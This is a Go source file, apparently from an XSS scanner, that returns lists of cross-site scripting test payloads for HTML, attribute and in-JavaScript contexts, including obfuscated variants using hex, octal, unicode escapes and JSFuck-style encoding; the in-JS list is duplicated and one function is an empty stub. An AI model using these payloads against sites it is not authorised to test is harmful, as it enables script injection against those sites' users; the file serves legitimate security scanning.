package scanning

func getCommonPayload() []string {
	payload := []string{
		// include verify payload
		"\"><SvG/onload=alert(45) id=dalfox>",
		"\"><Svg/onload=alert(45) class=dlafox>",
		"'><sVg/onload=alert(45) id=dalfox>",
		"'><sVg/onload=alert(45) class=dalfox>",
		"</ScriPt><sCripT id=dalfox>alert(45)</sCriPt>",
		"</ScriPt><sCripT class=dalfox>alert(45)</sCriPt>",
		"\"><a href=javas&#99;ript:alert(1)/class=dalfox>click",
		"'><a href=javas&#99;ript:alert(1)/class=dalfox>click",
		"'><svg/class='dalfox'onLoad=alert(45)>",
		"\"><d3\"<\"/onclick=\"45 class=dalfox>[confirm``]\"<\">z",
		"\"><w=\"/x=\"y>\"/class=dalfox/ondblclick=`<`[confir\u006d``]>z",
		"\"><iFrAme/src=jaVascRipt:alert(45) class=dalfox></iFramE>",
		"\"><svg/class=\"dalfox\"onLoad=alert(45)>",

		// not include verify payload
		"\"><script/\"<a\"/src=data:=\".<a,[45].some(confirm)>",
		"\"><script y=\"><\">/*<script* */prompt()</script",
		"<xmp><p title=\"</xmp><svg/onload=alert(45)>",
		"\"><d3\"<\"/onclick=\"45>[confirm``]\"<\">z",
		"\"><a href=\"javascript&colon;alert(45)\">click",
		"'><a href='javascript&colon;alert(45)'>click",
		"\"><iFrAme/src=jaVascRipt:alert(45)></iFramE>",
		"\">asd",
		"'>asd",
	}
	return payload
}

func getAttrPayload() []string {
	payload := []string{
		"' onmouseleave=confirm(45) class=dalfox '",
		"\"><SvG/onload=alert(45)>",
		"'><sVg/onload=alert(45)>",
		"</ScriPt><sCripT>alert(45)</sCriPt>",
		"\"  onmouseleave=confirm(45) class=dalfox \"",
		"'  onmouseleave=confirm(45) id=dalfox '",
		"\"  onmouseleave=confirm(45) id=dalfox \"",
		"' onpointerenter=prompt`45` class=dalfox '",
		"\"  onpointerenter=prompt`45` class=dalfox \"",
		"'  onpointerenter=prompt`45` id=dalfox '",
		"\"  onpointerenter=prompt`45` id=dalfox \"",
		"' class=dalfox '",
		"\" class=dalfox \"",
		"' id=dalfox '",
		"\" id=dalfox \"",
	}
	return payload
}

func getInJsPayload() []string {
	payload := []string{
		"'+alert(45)+'",
		"\"+alert(45)+\"",
		"'-confirm`45`-'",
		"\"-confirm`45`-\"",
		"</script><svg/onload=alert(45)>",
		"</script><script>alert(45)</script>",
		"';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//",
		"';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//",
		"';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//",
		"';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//",
		"';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//",
		"';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//",
		"';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//",
		"';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//",
		"';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//",
		"';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//",
		"';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//",
		"';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//",
		"';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//",
		"';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//",
		"';window['x61x6cx65x72x74'](window['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';self['x61x6cx65x72x74'](self['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';this['x61x6cx65x72x74'](this['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';top['x61x6cx65x72x74'](top['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';parent['x61x6cx65x72x74'](parent['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';frames['x61x6cx65x72x74'](frames['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';globalThis['x61x6cx65x72x74'](globalThis['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';window['x65x76x61x6c']('window['x61x6cx65x72x74'](window['x61x74x6fx62']('WFNT'))');//",
		"';self['x65x76x61x6c']('self['x61x6cx65x72x74'](self['x61x74x6fx62']('WFNT'))');//",
		"';this['x65x76x61x6c']('this['x61x6cx65x72x74'](this['x61x74x6fx62']('WFNT'))');//",
		"';top['x65x76x61x6c']('top['x61x6cx65x72x74'](top['x61x74x6fx62']('WFNT'))');//",
		"';parent['x65x76x61x6c']('parent['x61x6cx65x72x74'](parent['x61x74x6fx62']('WFNT'))');//",
		"';frames['x65x76x61x6c']('frames['x61x6cx65x72x74'](frames['x61x74x6fx62']('WFNT'))');//",
		"';globalThis['x65x76x61x6c']('globalThis['x61x6cx65x72x74'](globalThis['x61x74x6fx62']('WFNT'))');//",
		"';window['141154145162164']('130123123');//",
		"';self['141154145162164']('130123123');//",
		"';this['141154145162164']('130123123');//",
		"';top['141154145162164']('130123123');//",
		"';parent['141154145162164']('130123123');//",
		"';frames['141154145162164']('130123123');//",
		"';globalThis['141154145162164']('130123123');//",
		"';window['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';self['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';this['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';top['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';parent['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';frames['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';globalThis['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';window[/al/.source+/ert/.source](/XSS/.source);//",
		"';self[/al/.source+/ert/.source](/XSS/.source);//",
		"';this[/al/.source+/ert/.source](/XSS/.source);//",
		"';top[/al/.source+/ert/.source](/XSS/.source);//",
		"';parent[/al/.source+/ert/.source](/XSS/.source);//",
		"';frames[/al/.source+/ert/.source](/XSS/.source);//",
		"';globalThis[/al/.source+/ert/.source](/XSS/.source);//",
		"';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//", "';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//",
		"';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//",
		"';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//",
		"';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//",
		"';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//",
		"';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//",
		"';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//",
		"';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//",
		"';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//",
		"';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//",
		"';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//",
		"';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//",
		"';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//",
		"';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//",
		"';window['x61x6cx65x72x74'](window['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';self['x61x6cx65x72x74'](self['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';this['x61x6cx65x72x74'](this['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';top['x61x6cx65x72x74'](top['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';parent['x61x6cx65x72x74'](parent['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';frames['x61x6cx65x72x74'](frames['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';globalThis['x61x6cx65x72x74'](globalThis['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);//",
		"';window['x65x76x61x6c']('window['x61x6cx65x72x74'](window['x61x74x6fx62']('WFNT'))');//",
		"';self['x65x76x61x6c']('self['x61x6cx65x72x74'](self['x61x74x6fx62']('WFNT'))');//",
		"';this['x65x76x61x6c']('this['x61x6cx65x72x74'](this['x61x74x6fx62']('WFNT'))');//",
		"';top['x65x76x61x6c']('top['x61x6cx65x72x74'](top['x61x74x6fx62']('WFNT'))');//",
		"';parent['x65x76x61x6c']('parent['x61x6cx65x72x74'](parent['x61x74x6fx62']('WFNT'))');//",
		"';frames['x65x76x61x6c']('frames['x61x6cx65x72x74'](frames['x61x74x6fx62']('WFNT'))');//",
		"';globalThis['x65x76x61x6c']('globalThis['x61x6cx65x72x74'](globalThis['x61x74x6fx62']('WFNT'))');//",
		"';window['141154145162164']('130123123');//",
		"';self['141154145162164']('130123123');//",
		"';this['141154145162164']('130123123');//",
		"';top['141154145162164']('130123123');//",
		"';parent['141154145162164']('130123123');//",
		"';frames['141154145162164']('130123123');//",
		"';globalThis['141154145162164']('130123123');//",
		"';window['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';self['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';this['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';top['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';parent['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';frames['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';globalThis['u{0061}u{006c}u{0065}u{0072}u{0074}']('u{0058}u{0053}u{0053}');//",
		"';window[/al/.source+/ert/.source](/XSS/.source);//",
		"';self[/al/.source+/ert/.source](/XSS/.source);//",
		"';this[/al/.source+/ert/.source](/XSS/.source);//",
		"';top[/al/.source+/ert/.source](/XSS/.source);//",
		"';parent[/al/.source+/ert/.source](/XSS/.source);//",
		"';frames[/al/.source+/ert/.source](/XSS/.source);//",
		"';globalThis[/al/.source+/ert/.source](/XSS/.source);//",
		"';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
		"';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//",
	}
	return payload
}

func makeDynamicPayload(badchars, rtype string) []string {
	payload := []string{}
	if rtype == "inHTML" {
		for _, _ = range badchars {

		}
	} else {
		// inJS

	}
	return payload
}